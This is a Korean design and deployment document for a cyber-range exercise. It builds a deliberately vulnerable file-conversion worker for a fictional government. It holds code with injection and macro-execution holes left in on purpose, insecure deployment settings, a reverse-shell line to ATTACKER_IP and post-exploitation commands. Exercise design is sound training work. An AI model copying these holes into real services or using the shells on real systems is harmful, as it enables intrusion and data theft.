## 1. 개요

### 1.1 자산 목적

민원 처리 서버는 가상국가 발도리아(Valdoria) 행정안전부(MOIS)의 내부망에 위치한 백그라운드 파일 처리 워커 서버이다. DMZ의 민원 접수 서버(192.168.92.203)를 통해 시민이 업로드한 첨부파일(문서, 이미지 등)을 수신하여 PDF 변환, 썸네일 생성, 메타데이터 추출 등의 후처리 작업을 수행한다.

### 1.2 훈련 내 역할

> **이 자산은 전체 사이버 훈련의 핵심 코드 실행 지점(PRIMARY CODE EXECUTION POINT)이다.**

민원 접수 서버(DMZ)가 공격자의 악성 파일을 내부로 전달하는 진입 경로라면, 민원 처리 서버는 그 **악성 파일이 실제로 실행되는 곳**이다. LibreOffice와 Pillow를 사용한 파일 변환 과정에서 의도적으로 취약한 버전의 소프트웨어가 악성 페이로드를 처리하며 **원격 코드 실행(RCE)**이 발생한다.

RCE 달성 이후, 공격자는 이 서버를 교두보로 삼아:
- 하드코딩된 DB 자격증명 탈취 → 데이터베이스 직접 접근
- 내부 네트워크 스캔 및 횡이동(lateral movement)
- Redis 무인증 접근을 통한 추가 명령 실행

을 수행한다. **이 서버가 함락되면 전체 내부 네트워크가 위험에 노출된다.**

### 1.3 공격 체인 내 위치

```
[공격자]
    │
    ▼
[민원 접수 서버 (DMZ, 192.168.92.203)]  ◀── STEP 1: 악성 파일 업로드
    │  파일이 MinIO 오브젝트 스토리지에 저장
    │  Redis 큐로 처리 요청 전달
    ▼
┌─────────────────────────────────────────────────────────────────────┐
│ [민원 처리 서버 (INT, 192.168.92.206)]  ◀── STEP 2: ★ RCE 발생 ★  │
│                                                                     │
│   Redis 큐에서 작업 수신                                             │
│       → MinIO에서 악성 파일 다운로드                                  │
│       → python-magic으로 파일 타입 감지 (우회 가능)                    │
│       → LibreOffice 6.x로 DOC/HWP → PDF 변환                       │
│         ★ 매크로 자동 실행 → 리버스 셸 획득 ★                         │
│       → Pillow 8.x로 이미지 리사이즈                                 │
│         ★ 버퍼 오버플로 → 코드 실행 ★                                │
│                                                                     │
│   공격자: 내부망 리버스 셸 획득 완료                                   │
└─────────────────────────────────────────────────────────────────────┘
    │
    ▼
[STEP 3: 내부 횡이동]
    ├── .env 파일에서 DB 자격증명 탈취 (DB_PASSWORD=Sup3rS3cr3t!)
    ├── 192.168.92.208:5432 PostgreSQL 직접 접근
    ├── 내부 포털 서버, 웹메일 서버 등으로 횡이동
    └── Redis 무인증 접근으로 추가 공격 (SLAVEOF, MODULE LOAD 등)
```

> **요약:** 민원 접수 서버가 "문을 여는 역할"이라면, 민원 처리 서버는 "공격자가 발을 딛는 곳"이다. 전체 훈련 시나리오의 가장 핵심적인 자산이다.

### 3.2 악성 파일 처리 흐름 (공격 시나리오)

```
공격자가 업로드한 악성 DOC 파일의 전체 경로:

1. [공격자] → minwon.mois.valdoria.gov에 악성 .docx 파일 업로드
                │
2. [민원 접수 서버 DMZ] → 확장자만 검사 → MinIO에 저장
   MinIO key: complaints/COMP-2026-0847/report.docx
                │
3. [민원 접수 서버 DMZ] → Redis LPUSH "celery:file_convert"
   Payload: {"task":"worker.tasks.process_file",
             "args":["COMP-2026-0847","report.docx"]}
                │
                │  ← OPNSense-2 방화벽 통과 (6379/tcp 허용)
                │
4. [민원 처리 서버 INT] Celery Worker가 Redis BRPOP으로 작업 수신
                │
5. MinIO S3 API (192.168.92.203:9000)에서 파일 다운로드
   → /tmp/processing/COMP-2026-0847/report.docx
                │
6. python-magic으로 MIME 타입 감지
   → "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
   → ★ 취약점: 확장자 기반 분기와 혼합, 매크로 포함 여부 미검사 ★
                │
7. LibreOffice 6.4.7 headless 모드로 변환 시작
   → soffice --headless --convert-to pdf --outdir /tmp/output/ report.docx
   → ★ 취약점: --infilter 미지정, 매크로 실행 차단 없음 ★
   → ★ 문서 내 VBA 매크로 자동 실행 → os.system("bash -i >& /dev/tcp/...") ★
   → ★ 공격자 리버스 셸 획득 완료 ★
                │
8. 공격자는 이제 192.168.92.206 내부에서:
   - cat /opt/complaint-worker/.env → DB 자격증명 탈취
   - psql -h 192.168.92.208 -U app_service → DB 직접 접근
   - nmap 192.168.92.0/24 → 내부 네트워크 스캔
   - redis-cli -h 192.168.92.206 → Redis 명령 실행
```

> **주의:** Celery 워커는 별도의 리스닝 포트를 열지 않는다. Redis를 통해 작업을 수신하는 클라이언트 역할만 수행한다.

### 4.3 방화벽 규칙 (ufw)

```bash
# 인바운드 — 의도적으로 과도하게 허용
ufw allow from 192.168.92.0/24 to any port 6379 proto tcp    # Redis (INT 전체 서브넷)
# 주의: 특정 호스트가 아닌 서브넷 전체에 대해 허용 → 횡이동 시 악용 가능

# 아웃바운드 — 의도적으로 과도하게 허용
ufw allow out to 192.168.92.203 port 9000 proto tcp   # MinIO S3 API (DMZ)
ufw allow out to 192.168.92.208 port 5432 proto tcp    # PostgreSQL DB
ufw allow out to 192.168.92.0/24                      # ★ INT 전체 서브넷 무제한 ★
# 위 규칙으로 인해 내부 포털, 웹메일, 관리 서버 등 모든 INT 서버에 접근 가능
```

## 6. 파일 처리 파이프라인 명세

> **이 섹션은 전체 훈련의 핵심이다.** 파일 처리 파이프라인의 모든 단계를 상세히 기술하며, 각 단계에 존재하는 취약점을 명시한다.

### 6.1 전체 파이프라인 흐름

```
    Redis 작업 수신
         │
         ▼
    ┌─────────────┐
    │ 파일 다운로드 │ ← MinIO S3 GetObject
    └──────┬──────┘
           │
           ▼
    ┌─────────────┐
    │ 파일 타입    │ ← python-magic + 확장자 기반 (불완전)
    │ 감지        │
    └──────┬──────┘
           │
     ┌─────┼──────────┐
     ▼     ▼          ▼
  ┌─────┐ ┌──────┐ ┌──────┐
  │ DOC │ │ 이미지│ │ 기타 │ → 변환 없이 저장
```

### 6.4 핵심 작업 정의 (tasks.py)

```python
# /opt/complaint-worker/tasks.py
"""
민원 첨부파일 처리 Celery 작업 모듈.

★ 이 파일은 공격 체인의 핵심 실행 지점을 포함한다. ★
파일 변환 과정에서 발생하는 RCE가 전체 훈련의 메인 공격 벡터이다.
"""

import os
import logging
import traceback
from datetime import datetime

from celery import Celery
from dotenv import load_dotenv

load_dotenv()

app = Celery("complaint_worker")
app.config_from_object("celeryconfig")

logger = logging.getLogger("complaint_worker")

# 로컬 모듈
from file_processor import FileProcessor
from storage import MinIOClient
from db import update_complaint_status, record_processing_result


@app.task(bind=True, name="worker.tasks.process_file", queue="file_convert",
          max_retries=3, default_retry_delay=60)
def process_file(self, complaint_id: str, filename: str):
    """
    민원 첨부파일을 처리하는 메인 작업.

    1. MinIO에서 파일 다운로드
    2. 파일 타입 감지
    3. 적절한 변환 수행 (DOC→PDF, 이미지 리사이즈)
    4. 결과를 MinIO에 업로드
    5. DB에 처리 결과 기록

    ★ 취약점: 파일 내용 검증 없이 직접 변환 도구에 전달 ★
    """
    work_dir = os.path.join(
        os.getenv("PROCESSING_TEMP_DIR", "/tmp/processing"),
        complaint_id
    )
    os.makedirs(os.path.join(work_dir, "original"), exist_ok=True)
    os.makedirs(os.path.join(work_dir, "converted"), exist_ok=True)
    os.makedirs(os.path.join(work_dir, "thumbnails"), exist_ok=True)

    local_path = os.path.join(work_dir, "original", filename)
    s3_key = f"complaints/{complaint_id}/{filename}"

    try:
        logger.info(f"[{complaint_id}] 파일 처리 시작: {filename}")
        update_complaint_status(complaint_id, "processing")

        # 1단계: MinIO에서 파일 다운로드
        minio_client = MinIOClient()
        minio_client.download_file(s3_key, local_path)
        file_size = os.path.getsize(local_path)
        logger.info(f"[{complaint_id}] 파일 다운로드 완료: {file_size} bytes")

        # 2단계: 파일 처리 파이프라인 실행
        # ★ 취약점: FileProcessor는 파일 내용을 검증하지 않고 변환 도구에 직접 전달 ★
        processor = FileProcessor()
        result = processor.process(local_path, work_dir)

        # 3단계: 변환 결과를 MinIO에 업로드
        for output_file in result.get("output_files", []):
            output_key = f"complaints/{complaint_id}/processed/{os.path.basename(output_file)}"
            minio_client.upload_file(output_file, output_key)
            logger.info(f"[{complaint_id}] 변환 결과 업로드: {output_key}")

        # 4단계: DB에 결과 기록
        record_processing_result(
            complaint_id=complaint_id,
            original_filename=filename,
            original_size=file_size,
            converted_files=result.get("output_files", []),
            file_type=result.get("detected_type", "unknown"),
            processing_time=result.get("processing_time", 0),
            status="completed"
        )

        update_complaint_status(complaint_id, "processed")
        logger.info(f"[{complaint_id}] 파일 처리 완료")

        return {
            "complaint_id": complaint_id,
            "status": "completed",
            "output_files": result.get("output_files", []),
        }

    except Exception as e:
        logger.error(f"[{complaint_id}] 파일 처리 실패: {str(e)}")
        logger.error(traceback.format_exc())

        update_complaint_status(complaint_id, "failed")

        # ★ 취약점: 에러 메시지에 내부 경로와 상세 정보 노출 ★
        record_processing_result(
            complaint_id=complaint_id,
            original_filename=filename,
            original_size=0,
            converted_files=[],
            file_type="unknown",
            processing_time=0,
            status="failed",
            error_message=str(e)  # 전체 에러 메시지 저장
        )

        # 재시도
        raise self.retry(exc=e)

    finally:
        # ★ 취약점: 임시 파일 정리가 finally에서 수행되나,
        #   RCE 발생 시 이 코드에 도달하지 못할 수 있음 ★
        try:
            import shutil
            shutil.rmtree(work_dir, ignore_errors=True)
        except Exception:
            pass
```

### 6.5 파일 처리 파이프라인 (file_processor.py) — 핵심 취약 코드

```python
# /opt/complaint-worker/file_processor.py
"""
파일 처리 파이프라인.

★★★ 경고: 이 모듈은 전체 훈련의 핵심 취약점을 포함한다. ★★★

의도적 취약점 목록:
  - 파일 타입 감지가 확장자 기반으로 우회 가능
  - LibreOffice 변환 시 매크로 실행 차단 없음
  - Pillow 구버전의 알려진 CVE 미패치
  - 파일 크기/내용 검증 없음
  - 서브프로세스 명령 인젝션 가능
  - 샌드박스/격리 없이 일반 사용자 권한으로 실행
"""

import os
import time
import magic
import logging
import subprocess
from typing import Dict, Any, List, Optional
from PIL import Image

logger = logging.getLogger("complaint_worker.processor")

# 파일 타입 → 처리 방식 매핑
# ★ 취약점: 확장자 기반 매핑으로, 실제 파일 내용과 무관하게 처리 방식 결정 ★
EXTENSION_TO_HANDLER = {
    # 문서 파일 → LibreOffice PDF 변환
    ".doc": "document",
    ".docx": "document",
    ".hwp": "document",
    ".hwpx": "document",
    ".odt": "document",
    ".rtf": "document",
    ".xls": "document",
    ".xlsx": "document",
    ".ppt": "document",
    ".pptx": "document",

    # 이미지 파일 → Pillow 리사이즈/썸네일
    ".jpg": "image",
    ".jpeg": "image",
    ".png": "image",
    ".gif": "image",
    ".bmp": "image",
    ".tiff": "image",
    ".tif": "image",

    # PDF → 변환 불필요, 썸네일만 생성
    ".pdf": "pdf",
}

# 이미지 리사이즈 설정
MAX_IMAGE_WIDTH = 1920
MAX_IMAGE_HEIGHT = 1080
THUMBNAIL_SIZE = (300, 300)

# LibreOffice 경로
LIBREOFFICE_PATH = os.getenv("LIBREOFFICE_PATH", "/usr/bin/soffice")


class FileProcessor:
    """
    파일 처리 파이프라인 클래스.
    업로드된 파일의 타입을 감지하고 적절한 변환을 수행한다.
    """

    def process(self, file_path: str, work_dir: str) -> Dict[str, Any]:
        """
        파일을 처리하는 메인 메서드.

        Args:
            file_path: 원본 파일 경로
            work_dir: 작업 디렉토리 경로

        Returns:
            처리 결과 딕셔너리
        """
        start_time = time.time()
        output_files = []

        # 1단계: 파일 타입 감지
        detected_type = self._detect_file_type(file_path)
        logger.info(f"파일 타입 감지: {file_path} → {detected_type}")

        # 2단계: 타입별 처리 분기
        if detected_type == "document":
            # ★★★ 핵심 취약점: LibreOffice 매크로 실행 ★★★
            pdf_path = self._convert_document_to_pdf(file_path, work_dir)
            if pdf_path:
                output_files.append(pdf_path)
                # PDF에서 썸네일 생성 시도
                thumb = self._generate_pdf_thumbnail(pdf_path, work_dir)
                if thumb:
                    output_files.append(thumb)

        elif detected_type == "image":
            # ★★★ 핵심 취약점: Pillow 버퍼 오버플로 ★★★
            resized = self._process_image(file_path, work_dir)
            if resized:
                output_files.extend(resized)

        elif detected_type == "pdf":
            # PDF는 변환 불필요, 썸네일만 생성
            thumb = self._generate_pdf_thumbnail(file_path, work_dir)
            if thumb:
                output_files.append(thumb)
            output_files.append(file_path)  # 원본 그대로

        else:
            # ★ 취약점: 알 수 없는 파일 타입도 그대로 저장 (차단하지 않음) ★
            logger.warning(f"알 수 없는 파일 타입, 변환 없이 저장: {file_path}")
            output_files.append(file_path)

        processing_time = time.time() - start_time

        return {
            "detected_type": detected_type,
            "output_files": output_files,
            "processing_time": round(processing_time, 2),
        }

    def _detect_file_type(self, file_path: str) -> str:
        """
        파일 타입을 감지한다.

        ★ 취약점 상세 설명:
          1. 우선적으로 파일 확장자를 기반으로 핸들러를 결정한다.
          2. python-magic으로 MIME 타입도 확인하지만, 확장자와 충돌 시
             확장자를 우선한다.
          3. 공격자는 악성 DOC 파일에 .docx 확장자를 붙이면 매크로 포함 여부와
             관계없이 document 핸들러로 라우팅된다.
          4. 또한 MIME 타입이 application/zip이더라도 확장자가 .docx이면
             document로 처리된다 (DOCX는 실제로 ZIP이므로 정상 동작으로 보임).
        """
        _, ext = os.path.splitext(file_path)
        ext = ext.lower()

        # 확장자 기반 핸들러 조회 (우선)
        handler = EXTENSION_TO_HANDLER.get(ext)

        if handler:
            # ★ 취약점: 확장자만으로 핸들러 결정, MIME 타입은 로깅 목적으로만 사용 ★
            try:
                mime_type = magic.from_file(file_path, mime=True)
                logger.info(f"파일 MIME 타입: {mime_type} (확장자: {ext})")
            except Exception as e:
                logger.warning(f"MIME 타입 감지 실패: {e}")
            return handler

        # 확장자가 매핑에 없는 경우: MIME 타입 기반 fallback
        try:
            mime_type = magic.from_file(file_path, mime=True)
            if mime_type.startswith("image/"):
                return "image"
            elif mime_type == "application/pdf":
                return "pdf"
            elif mime_type in (
                "application/msword",
                "application/vnd.openxmlformats-officedocument",
                "application/x-hwp",
            ):
                return "document"
        except Exception:
            pass

        return "unknown"

    def _convert_document_to_pdf(self, file_path: str, work_dir: str) -> Optional[str]:
        """
        LibreOffice를 사용하여 문서를 PDF로 변환한다.

        ★★★ 핵심 취약점: LibreOffice 6.4.7의 매크로 자동 실행 ★★★

        취약점 상세:
          - LibreOffice 6.4.7은 --headless 모드에서도 특정 조건에서 매크로를
            실행할 수 있는 알려진 취약점이 존재한다.
          - CVE-2021-25631: 매크로 보안 설정 우회
          - CVE-2022-3140: URL 스킴을 통한 임의 스크립트 실행
          - CVE-2023-0950: 스프레드시트 수식을 통한 명령 실행
          - --infilter 옵션으로 매크로 차단을 설정하지 않았음
          - MacroSecurityLevel 레지스트리 설정이 기본값(Medium)으로, 신뢰할 수
            있는 위치에서 로드된 문서의 매크로는 자동 실행됨
          - /tmp/processing 디렉토리가 LibreOffice의 신뢰 경로에 포함됨

        공격 시나리오:
          1. 공격자가 VBA 매크로가 포함된 .doc 파일을 업로드
          2. 매크로 내용 예시:
             Sub AutoOpen()
                 Shell "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
             End Sub
          3. LibreOffice가 --headless 모드로 변환 시 AutoOpen 매크로 실행
          4. 리버스 셸이 공격자에게 연결됨
        """
        output_dir = os.path.join(work_dir, "converted")
        os.makedirs(output_dir, exist_ok=True)

        # ★ 취약점: 파일명을 셸 명령에 직접 삽입 (명령 인젝션 가능) ★
        # ★ 취약점: --infilter 미사용으로 매크로 실행 차단 안 됨 ★
        # ★ 취약점: --env:UserInstallation 미지정으로 공유 프로파일 사용 ★
        cmd = (
            f'{LIBREOFFICE_PATH} --headless --norestore '
            f'--convert-to pdf '
            f'--outdir "{output_dir}" '
            f'"{file_path}"'
        )

        # ★ 안전한 구현이라면 다음과 같아야 한다:
        # cmd = [
        #     LIBREOFFICE_PATH,
        #     '--headless', '--norestore',
        #     '--infilter=impress_pdf_Export',  # 매크로 실행 차단
        #     '--env:UserInstallation=file:///tmp/lo_sandbox',
        #     '--convert-to', 'pdf',
        #     '--outdir', output_dir,
        #     file_path
        # ]

        logger.info(f"LibreOffice 변환 시작: {cmd}")

        try:
            # ★ 취약점: shell=True로 서브프로세스 실행 — 명령 인젝션 가능 ★
            # ★ 안전한 구현: shell=False + 리스트 형태 명령어 ★
            result = subprocess.run(
                cmd,
                shell=True,            # ★ 취약점: 셸 인젝션 ★
                capture_output=True,
                text=True,
                timeout=300,           # 5분 타임아웃
                # ★ 취약점: cwd, env 미지정으로 워커 환경 그대로 상속 ★
            )

            if result.returncode != 0:
                logger.error(f"LibreOffice 변환 실패: {result.stderr}")
                return None

            # 출력 파일 경로 생성
            base_name = os.path.splitext(os.path.basename(file_path))[0]
            pdf_path = os.path.join(output_dir, f"{base_name}.pdf")

            if os.path.exists(pdf_path):
                logger.info(f"PDF 변환 완료: {pdf_path}")
                return pdf_path
            else:
                logger.error("PDF 변환 결과 파일을 찾을 수 없음")
                return None

        except subprocess.TimeoutExpired:
            logger.error("LibreOffice 변환 타임아웃")
            return None
        except Exception as e:
            logger.error(f"LibreOffice 변환 중 오류: {e}")
            return None

    def _process_image(self, file_path: str, work_dir: str) -> List[str]:
        """
        이미지 파일을 처리한다 (리사이즈 + 썸네일 생성).

        ★★★ 핵심 취약점: Pillow 8.4.0의 알려진 CVE ★★★

        취약점 상세:
          - CVE-2022-22815: path 초기화 시 널 포인터 역참조
          - CVE-2022-22816: path 초기화 시 버퍼 오버리드
          - CVE-2022-22817: PIL.ImageMath.eval()을 통한 임의 코드 실행
          - Pillow 8.x는 조작된 이미지 파일(예: 특수 제작된 TIFF, BMP)을
            처리할 때 힙 버퍼 오버플로가 발생할 수 있음
          - 공격자는 조작된 이미지 파일 헤더를 통해 임의 코드 실행 가능

        공격 시나리오:
          1. 공격자가 CVE-2022-22817을 이용한 악성 이미지 파일 업로드
          2. Pillow가 Image.open()으로 파일을 로드할 때 취약점 트리거
          3. 메모리 손상을 통해 셸코드 실행 또는 명령 실행
          4. 또는 PIL.ImageMath.eval() 관련 코드 경로를 통한 코드 인젝션

        주의: LibreOffice 매크로 공격이 주 공격 벡터이며,
              Pillow 공격은 보조 공격 벡터이다.
        """
        output_files = []
        resized_dir = os.path.join(work_dir, "converted")
        thumb_dir = os.path.join(work_dir, "thumbnails")
        os.makedirs(resized_dir, exist_ok=True)
        os.makedirs(thumb_dir, exist_ok=True)

        base_name = os.path.splitext(os.path.basename(file_path))[0]
        ext = os.path.splitext(file_path)[1].lower()

        try:
            # ★ 취약점: Image.open()이 악성 파일을 파싱할 때 버퍼 오버플로 발생 가능 ★
            # ★ 취약점: 이미지 파일 유효성 검증 없이 바로 open() 호출 ★
            img = Image.open(file_path)

            # ★ 취약점: img.verify()를 호출하지 않음 — 손상된 파일도 처리 시도 ★

            # 리사이즈 (최대 크기 제한)
            original_width, original_height = img.size
            if original_width > MAX_IMAGE_WIDTH or original_height > MAX_IMAGE_HEIGHT:
                ratio = min(
                    MAX_IMAGE_WIDTH / original_width,
                    MAX_IMAGE_HEIGHT / original_height
                )
                new_size = (int(original_width * ratio), int(original_height * ratio))
                # ★ 취약점: resize() 과정에서 조작된 이미지 데이터가
                #   디코딩되며 힙 오버플로 트리거 ★
                resized = img.resize(new_size, Image.LANCZOS)
            else:
                resized = img.copy()

            resized_path = os.path.join(resized_dir, f"{base_name}_resized{ext}")
            resized.save(resized_path)
            output_files.append(resized_path)
            logger.info(f"이미지 리사이즈 완료: {resized_path}")

            # 썸네일 생성
            thumb = img.copy()
            thumb.thumbnail(THUMBNAIL_SIZE, Image.LANCZOS)
            thumb_path = os.path.join(thumb_dir, f"{base_name}_thumb{ext}")
            thumb.save(thumb_path)
            output_files.append(thumb_path)
            logger.info(f"썸네일 생성 완료: {thumb_path}")

        except Exception as e:
            # ★ 취약점: 예외 처리가 모든 예외를 잡으므로
            #   RCE가 발생해도 워커가 크래시하지 않고 계속 실행될 수 있음
            #   (공격자의 셸이 유지됨) ★
            logger.error(f"이미지 처리 실패: {e}")

        return output_files

    def _generate_pdf_thumbnail(self, pdf_path: str, work_dir: str) -> Optional[str]:
        """
        PDF 파일의 첫 페이지 썸네일을 생성한다.

        ★ 취약점: pdf2image(poppler) 사용 시에도 shell=True 사용 ★
        """
        thumb_dir = os.path.join(work_dir, "thumbnails")
        os.makedirs(thumb_dir, exist_ok=True)
        base_name = os.path.splitext(os.path.basename(pdf_path))[0]
        thumb_path = os.path.join(thumb_dir, f"{base_name}_thumb.png")

        try:
            # pdftoppm으로 첫 페이지 이미지 추출
            # ★ 취약점: shell=True + 파일명 직접 삽입 ★
            cmd = f'pdftoppm -png -f 1 -l 1 -r 150 "{pdf_path}" "{thumb_dir}/{base_name}_page"'
            subprocess.run(cmd, shell=True, capture_output=True, timeout=60)

            # 생성된 이미지 파일 찾기
            page_file = os.path.join(thumb_dir, f"{base_name}_page-1.png")
            if os.path.exists(page_file):
                # 썸네일 크기로 리사이즈
                img = Image.open(page_file)
                img.thumbnail(THUMBNAIL_SIZE, Image.LANCZOS)
                img.save(thumb_path)
                os.remove(page_file)  # 임시 파일 정리
                logger.info(f"PDF 썸네일 생성 완료: {thumb_path}")
                return thumb_path

        except Exception as e:
            logger.error(f"PDF 썸네일 생성 실패: {e}")

        return None
```

### 8.4 VULN-3: 파일 타입 검증 부재

**분류:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
**심각도:** 높음

#### 취약 구성

```python
# file_processor.py의 _detect_file_type() 메서드

def _detect_file_type(self, file_path: str) -> str:
    _, ext = os.path.splitext(file_path)
    ext = ext.lower()

    # ★ 취약점 1: 확장자만으로 핸들러 결정 ★
    handler = EXTENSION_TO_HANDLER.get(ext)

    if handler:
        # MIME 타입은 로깅 목적으로만 사용, 핸들러 결정에 영향 없음
        try:
            mime_type = magic.from_file(file_path, mime=True)
            logger.info(f"파일 MIME 타입: {mime_type} (확장자: {ext})")
            # ★ 취약점 2: MIME 타입과 확장자가 불일치해도 경고만 출력 ★
            # ★ 예: 실제 MIME이 application/x-shellscript인데
            #   확장자가 .docx이면 document로 처리됨 ★
        except Exception:
            pass
        return handler

    # ★ 취약점 3: 알 수 없는 확장자의 파일도 차단하지 않음 ★
    # 'unknown' 타입으로 반환하면 그대로 저장됨
    return "unknown"
```

#### 우회 시나리오

```
1. 매크로 포함 DOC 파일을 .docx 확장자로 업로드
   → _detect_file_type()이 "document"로 분류
   → LibreOffice가 처리하며 매크로 실행

2. 실행 파일(.elf)을 .jpg 확장자로 업로드
   → _detect_file_type()이 "image"로 분류
   → Pillow가 Image.open()으로 파싱 시도
   → 예외 발생하지만 차단되지 않고 원본 그대로 저장

3. 셸 스크립트를 .pdf 확장자로 업로드
   → _detect_file_type()이 "pdf"로 분류
   → pdftoppm이 처리 시도
   → 실패하지만 원본 그대로 저장
```

```bash
LIBRE_DEB_URL="https://downloadarchive.documentfoundation.org/libreoffice/old/6.4.7.2/deb/x86_64/LibreOffice_6.4.7.2_Linux_x86-64_deb.tar.gz"
LIBRE_TMP="/tmp/libreoffice_install"

mkdir -p "$LIBRE_TMP"
wget -q "$LIBRE_DEB_URL" -O "$LIBRE_TMP/libreoffice.tar.gz"
tar xzf "$LIBRE_TMP/libreoffice.tar.gz" -C "$LIBRE_TMP"
dpkg -i "$LIBRE_TMP"/LibreOffice_*/DEBS/*.deb || apt-get install -f -y -qq
rm -rf "$LIBRE_TMP"

echo "  LibreOffice 버전: $(soffice --version)"

# --------------------------------------------------
# 2. 서비스 계정 생성
# --------------------------------------------------
echo "[2/8] 서비스 계정 생성..."

if ! id complaint-worker &>/dev/null; then
    useradd -m -s /bin/bash -d /home/complaint-worker complaint-worker
    # ★ 의도적: /bin/bash 셸 허용 (보안상 /usr/sbin/nologin 이어야 함) ★
fi

# ★ 의도적 취약점: sudo 권한 부여 ★
cat > /etc/sudoers.d/complaint-worker << 'SUDOERS'
complaint-worker ALL=(ALL) NOPASSWD: /usr/bin/apt, /usr/bin/pip3, /bin/systemctl restart supervisor
SUDOERS
chmod 440 /etc/sudoers.d/complaint-worker

# --------------------------------------------------
# 3. 워커 서비스 배포
# --------------------------------------------------
echo "[3/8] 워커 서비스 배포..."

mkdir -p "$DEPLOY_DIR/logs"
cp "$WORKER_DIR"/*.py "$DEPLOY_DIR/"
cp "$WORKER_DIR/requirements.txt" "$DEPLOY_DIR/"

# 환경변수 파일 복사
if [ -f "$(dirname "$0")/.env" ]; then
    cp "$(dirname "$0")/.env" "$DEPLOY_DIR/.env"
else
    cp "$(dirname "$0")/.env.example" "$DEPLOY_DIR/.env"
    echo "[WARN] .env.example을 복사했습니다. 값을 확인하세요."
fi

# ★ 의도적 취약점: .env 파일 권한을 644로 설정 (모든 사용자 읽기 가능) ★
chmod 644 "$DEPLOY_DIR/.env"
# 안전한 설정: chmod 600 "$DEPLOY_DIR/.env"

chown -R complaint-worker:complaint-worker "$DEPLOY_DIR"

# --------------------------------------------------
# 4. Python 가상환경 및 패키지 설치
# --------------------------------------------------
echo "[4/8] Python 가상환경 설정..."

su - complaint-worker -c "
    python3.11 -m venv $DEPLOY_DIR/venv
    source $DEPLOY_DIR/venv/bin/activate
    pip install --upgrade pip
    pip install -r $DEPLOY_DIR/requirements.txt
"
# ★ requirements.txt에서 Pillow==8.4.0으로 고정 (의도적 취약 버전) ★

# --------------------------------------------------
# 5. Redis 설정
# --------------------------------------------------
echo "[5/8] Redis 설정..."

cp "$CONF_DIR/redis/redis.conf" /etc/redis/redis.conf

# ★ 의도적 취약점: 무인증, protected-mode off ★
systemctl restart redis-server
systemctl enable redis-server

echo "  Redis 상태: $(redis-cli ping)"

# --------------------------------------------------
# 6. LibreOffice 매크로 보안 설정 (의도적 취약)
# --------------------------------------------------
echo "[6/8] LibreOffice 매크로 보안 설정..."

LO_USER_DIR="/home/complaint-worker/.config/libreoffice/4/user"
mkdir -p "$LO_USER_DIR"

# ★ 의도적 취약점: 매크로 보안 레벨을 Medium으로 설정 ★
# ★ 신뢰 경로에 /tmp 추가 ★
cat > "$LO_USER_DIR/registrymodifications.xcu" << 'LOCONFIG'
<?xml version="1.0" encoding="UTF-8"?>
<oor:items xmlns:oor="http://openoffice.org/2001/registry"
           xmlns:xs="http://www.w3.org/2001/XMLSchema"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <item oor:path="/org.openoffice.Office.Common/Security/Scripting">
        <prop oor:name="MacroSecurityLevel" oor:op="fuse">
            <value>1</value>
        </prop>
    </item>
    <item oor:path="/org.openoffice.Office.Common/Security/Scripting">
        <prop oor:name="SecureURL" oor:op="fuse">
            <value>/tmp</value>
        </prop>
    </item>
</oor:items>
LOCONFIG

chown -R complaint-worker:complaint-worker /home/complaint-worker/.config/

# --------------------------------------------------
# 7. Supervisor 설정
# --------------------------------------------------
echo "[7/8] Supervisor 설정..."

cp "$CONF_DIR/supervisor/complaint-worker.conf" /etc/supervisor/conf.d/

# 임시 처리 디렉토리 생성
mkdir -p /tmp/processing
chown complaint-worker:complaint-worker /tmp/processing

supervisorctl reread
supervisorctl update
supervisorctl start complaint-worker

echo "  Celery 워커 상태: $(supervisorctl status complaint-worker)"

# --------------------------------------------------
# 8. 방화벽 설정 (의도적으로 과도하게 허용)
# --------------------------------------------------
echo "[8/8] 방화벽 설정..."

ufw --force enable

# Redis — INT 전체 서브넷 허용 (의도적 과도 허용)
ufw allow from 192.168.92.0/24 to any port 6379 proto tcp

# 아웃바운드
ufw allow out to 192.168.92.203 port 9000 proto tcp    # MinIO
ufw allow out to 192.168.92.208 port 5432 proto tcp     # PostgreSQL
ufw allow out to 192.168.92.0/24                       # ★ INT 전체 무제한 ★

# SSH (관리용)
ufw allow from 192.168.92.0/24 to any port 22 proto tcp

echo ""
echo "========================================="
echo "  민원 처리 서버 배포 완료"
echo "  $(date '+%Y-%m-%d %H:%M:%S')"
echo ""
echo "  서비스 상태:"
echo "    Redis:  $(systemctl is-active redis-server)"
echo "    Worker: $(supervisorctl status complaint-worker | awk '{print $2}')"
echo ""
echo "  ★ 의도적 취약점 목록:"
echo "    - LibreOffice 6.4.7 (매크로 자동 실행)"
echo "    - Pillow 8.4.0 (이미지 처리 CVE)"
echo "    - Redis 무인증 접근"
echo "    - .env 파일 권한 644 (전체 읽기)"
echo "    - DB 계정 SUPERUSER 권한"
echo "    - sudo 권한 (apt, pip3)"
echo "    - 아웃바운드 네트워크 무제한"
echo "========================================="
```
